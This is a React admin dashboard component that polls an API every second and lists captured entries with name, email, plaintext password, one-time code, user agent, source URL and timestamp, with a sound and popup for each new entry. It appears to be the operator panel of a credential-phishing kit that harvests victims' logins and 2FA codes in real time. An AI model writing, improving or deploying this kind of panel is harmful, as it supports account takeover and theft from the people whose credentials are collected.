"use client";

import withAuth from "@/app/utils/auth";
import { format } from "date-fns";
import { useCallback, useEffect, useMemo, useState } from "react";
import toast from "react-hot-toast";
import { MdDelete, MdKeyboardArrowLeft, MdKeyboardArrowRight } from "react-icons/md";
import useSWR, { mutate } from "swr";

// Utility functions
const fetcher = (url) => fetch(url).then((res) => res.json());
const playNotificationSound = () => {
  const audio = new Audio("/sounds/notification.mp3");
  audio.play();
};

const AdminDashboard = () => {
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 5;
  const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);
  const [userToDelete, setUserToDelete] = useState(null);
  const [isDeleting, setIsDeleting] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [prevUsers, setPrevUsers] = useState([]);

  const { data, isLoading } = useSWR("/api/information_list", fetcher, {
    refreshInterval: 1000,
  });

  useEffect(() => {
    if (data && prevUsers.length && data.length > prevUsers.length) {
      playNotificationSound();
      setShowPopup(true);
      setTimeout(() => setShowPopup(false), 3000);
    }

    if (data) {
      setPrevUsers(data);
    }
  }, [data, prevUsers]);

  // Pagination logic
  const reversedUsers = useMemo(() => (data ? [...data].reverse() : []), [data]);
  const totalPages = useMemo(
    () => (reversedUsers.length ? Math.ceil(reversedUsers.length / itemsPerPage) : 0),
    [reversedUsers]
  );
  const startIndex = useMemo(() => (currentPage - 1) * itemsPerPage, [currentPage]);
  const currentItems = useMemo(
    () => reversedUsers.slice(startIndex, startIndex + itemsPerPage),
    [reversedUsers, startIndex]
  );

  const handlePageChange = useCallback(
    (page) => {
      if (page >= 1 && page <= totalPages) {
        setCurrentPage(page);
      }
    },
    [totalPages]
  );

  // Adjust current page if items are deleted
  useEffect(() => {
    if (currentPage > totalPages && totalPages > 0) {
      setCurrentPage(totalPages);
    }
  }, [totalPages, currentPage]);

  const deleteLink = async () => {
    setIsDeleting(true);
    try {
      const response = await fetch("/api/information_list", {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: userToDelete }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Failed to delete the link");
      }

      toast.success("Link deleted successfully!");
      mutate("/api/information_list");

      if (currentItems.length === 1 && currentPage > 1) {
        setCurrentPage(currentPage - 1);
      } else if (currentPage > totalPages) {
        setCurrentPage(totalPages);
      }

      setIsDeleteModalOpen(false);
    } catch (error) {
      toast.error("Failed to delete the link. Please try again.");
      setIsDeleteModalOpen(false);
    } finally {
      setIsDeleting(false);
    }
  };

  if (isLoading || isDeleting) {
    return (
      <div className="p-4">
        <h1 className="mb-4 text-xl font-bold">Admin Dashboard</h1>
        <SkeletonLoader />
      </div>
    );
  }

  return (
    <div className="p-4">
      <h1 className="mb-4 text-2xl font-normal">Information List</h1>
      {showPopup && (
        <div className="fixed p-4 text-white bg-blue-500 rounded-lg shadow-lg top-4 right-4">
          New Information Added!
        </div>
      )}
      <Table
        currentItems={currentItems}
        startIndex={startIndex}
        onDelete={setUserToDelete}
        onOpenDeleteModal={setIsDeleteModalOpen}
      />
      <Pagination
        currentPage={currentPage}
        totalPages={totalPages}
        onPageChange={handlePageChange}
      />
      {isDeleteModalOpen && <DeleteModal onConfirm={deleteLink} onCancel={() => setIsDeleteModalOpen(false)} />}
    </div>
  );
};

// Skeleton loader component
const SkeletonLoader = () => (
  <>
    <table className="w-full border border-collapse border-gray-300 table-auto">
      <thead>
        <tr className="bg-gray-200">
          {["SL", "Name", "Dashboard User", "Email", "Password", "OTP", "Agent", "Url", "Date", "Delete"].map(
            (header) => (
              <th key={header} className="px-4 py-2 border border-gray-300 text-start">
                {header}
              </th>
            )
          )}
        </tr>
      </thead>
      <tbody>
        {[...Array(5)].map((_, index) => (
          <tr key={index} className="animate-pulse">
            {["", "", "", "", "", "", "", "", "", ""].map((_, index) => (
              <td key={index} className="px-4 py-2 bg-gray-300 border border-gray-300"></td>
            ))}
          </tr>
        ))}
      </tbody>
    </table>
    <div className="flex items-center gap-4 mt-4 animate-pulse">
      <div className="w-12 h-6 bg-gray-300"></div>
      <div className="flex gap-2">
        {[...Array(5)].map((_, index) => (
          <div key={index} className="w-8 h-6 bg-gray-300 rounded"></div>
        ))}
      </div>
      <div className="w-12 h-6 bg-gray-300"></div>
    </div>
  </>
);

// Table component
const Table = ({ currentItems, startIndex, onDelete, onOpenDeleteModal }) => (
  <div className="overflow-hidden" style={{ maxHeight: 'calc(100vh - 200px)' }}>
    <div className="overflow-y-auto max-h-[calc(100vh-200px)]">
      <table className="w-full border border-collapse border-gray-300 table-auto">
        <thead>
          <tr className="bg-gray-200">
            {["SL", "Name", "Email", "Password", "OTP", "Agent", "Url", "Date", "Delete"].map((header) => (
              <th key={header} className="px-4 py-2 border border-gray-300 text-start">
                {header}
              </th>
            ))}
          </tr>
        </thead>
        <tbody>
          {currentItems.map((user, index) => (
            <tr
              key={user._id}
              className={`${index % 2 === 0 ? "bg-gray-100" : "bg-white"} hover:bg-gray-200 transition-colors`}
            >
              <td className="px-4 py-2 border border-gray-300">{startIndex + index + 1}</td>
              <td className="px-4 py-2 border border-gray-300">{user.name}</td>
              <td className="px-4 py-2 border border-gray-300">{user.email}</td>
              <td className="px-4 py-2 border border-gray-300">{user.password}</td>
              {/* <td className="px-4 py-2 border border-gray-300">{user.ip}</td> */}
              <td className={`px-4 py-2 border border-gray-300 ${user?.otp ? "text-green-500" : "text-red-500"}`}>{user?.otp ? user?.otp : "N/A"}</td>
              <td className="px-4 py-2 border border-gray-300">{user.userAgent}</td>
              <td className="px-4 py-2 border border-gray-300">{user.url?.split("?")[0]}</td>
              <td className="px-4 py-2 border border-gray-300">
                {format(new Date(user.createdAt), "yyyy-MM-dd HH:mm:ss")}
              </td>
              <td className="px-4 py-2 text-center border border-gray-300">
                <button
                  onClick={() => {
                    onDelete(user._id);
                    onOpenDeleteModal(true);
                  }}
                  className="p-2 text-white bg-red-500 rounded hover:bg-red-600"
                  aria-label={`Delete user ${user.name}`}
                >
                  <MdDelete size={18} />
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  </div>
);

// Pagination component
const Pagination = ({ currentPage, totalPages, onPageChange }) => (
  <div className="flex items-center gap-4 mt-4">
    <button
      onClick={() => onPageChange(currentPage - 1)}
      className={`${currentPage === 1 ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
        } text-white px-3 py-2 rounded`}
      disabled={currentPage === 1}
    >
      <MdKeyboardArrowLeft />
    </button>
    <div className="flex gap-2">
      {Array.from({ length: totalPages }, (_, index) => (
        <button
          key={index}
          onClick={() => onPageChange(index + 1)}
          className={`${currentPage === index + 1 ? "bg-blue-500 text-white" : "bg-gray-200 text-gray-700"
            } px-4 py-1 rounded`}
        >
          {index + 1}
        </button>
      ))}
    </div>
    <button
      onClick={() => onPageChange(currentPage + 1)}
      className={`${currentPage === totalPages ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
        } text-white px-3 py-2 rounded`}
      disabled={currentPage === totalPages}
    >
      <MdKeyboardArrowRight />
    </button>
  </div>
);

// Delete Modal component
const DeleteModal = ({ onConfirm, onCancel }) => (
  <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
    <div className="p-6 bg-white rounded-lg shadow-lg">
      <h3 className="mb-4 text-lg font-bold">Are you sure you want to delete this link?</h3>
      <div className="flex justify-end gap-4">
        <button onClick={onCancel} className="px-4 py-2 bg-gray-300 rounded">
          Cancel
        </button>
        <button
          id="confirm-delete-button"
          onClick={onConfirm}
          className="px-4 py-2 text-white bg-red-500 rounded"
        >
          Confirm
        </button>
      </div>
    </div>
  </div>
);

export default withAuth(AdminDashboard);
